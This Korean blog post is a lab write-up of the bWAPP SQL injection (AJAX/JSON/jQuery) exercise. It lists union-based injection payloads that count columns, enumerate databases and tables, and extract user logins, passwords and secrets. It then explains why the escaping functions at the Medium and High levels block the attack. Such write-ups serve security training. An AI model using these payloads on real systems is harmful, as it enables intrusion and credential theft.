---
layout: single
title: (bWAPP)SQL Injection (AJAX/JSON/jQuery)
categories: Web-vuln
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/sqli-ajax-archive/sqli-ajax/image.png)
- 검색창에 임의의 문자를 주고 전송하는 방식이 아닌 문자열 입력시 즉시 반영되는 AJAX 형태의 검색창이 존재
> Ajax는 비동기식 javascript, XML을 나타내며, 서버와의 통신에서 Refresh 없이 요청에 대한 리소스가 출력 되거나, 즉각적인 반을을 일으킨다.

![그림 1-2](/assets/image/bwapp/injection/sqli-ajax-archive/sqli-ajax/image2.png)

- '(싱글 쿼터) 를 통한 Error는 발생하지 않음.
- SQL Injection의 취약 유/무는 '와 함께 조건문 삽입을 통해 확인

```sql
' order by 8--
```

- 컬럼 수를 파악했다.
![그림 1-3](/assets/image/bwapp/injection/sqli-ajax-archive/sqli-ajax/image3.png)

- 이후 동일하게 출력 포지션, 데이터베이스, 테이블, 컬럼순으로 파악해 나갔다.

```sql
1' union select 1,schema_name,3,4,5,6,7 from information_schema.schemata--
```

```sql
1' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema='bWAPP'--
```

```sql
1' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema='bWAPP'--
```

```sql
1' union select 1,concat(id,0x3a,login),concat(password,0x3a,secret),4,admin,6,7 from bWAPP.users--
```

![그림 1-4](/assets/image/bwapp/injection/sqli-ajax-archive/sqli-ajax/image4.png)

- 성공적으로 데이터를 추출했다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.